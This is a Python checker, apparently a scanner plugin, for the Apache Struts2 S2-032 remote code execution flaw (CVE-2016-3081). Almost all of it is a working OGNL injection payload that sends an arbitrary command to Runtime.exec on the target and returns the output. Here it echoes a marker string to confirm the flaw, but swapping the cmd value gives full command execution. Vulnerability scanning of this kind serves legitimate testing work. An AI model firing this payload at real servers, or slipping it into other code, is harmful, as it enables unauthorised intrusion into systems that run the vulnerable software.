import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-032 Remote Code Execution Vulnerablity（CVE-2016-3081）',
        'vulnerable': False
    }
    try:
        flag = 'sdfs7sdh32k4h9ffsj23aqv4mn'
        cmd_shell = 'echo+' + flag
        payload = r'?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={0}'
        payload1 = payload.format(cmd_shell)
        payload2 = payload.format(flag)
        vulurl1 = urllib.parse.urljoin(url, payload1)
        vulurl2 = urllib.parse.urljoin(url, payload2)
        req1 = requests.get(vulurl1, timeout=3)
        req2 = requests.get(vulurl2, timeout=3)
        if re.search(flag, req1.text):
            if re.search(flag, req2.text) and len(req2.text) < len(req1.text):
                pass
            else:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vulurl1
                relsult['exp'] = True
        return relsult
    except:
        return relsult




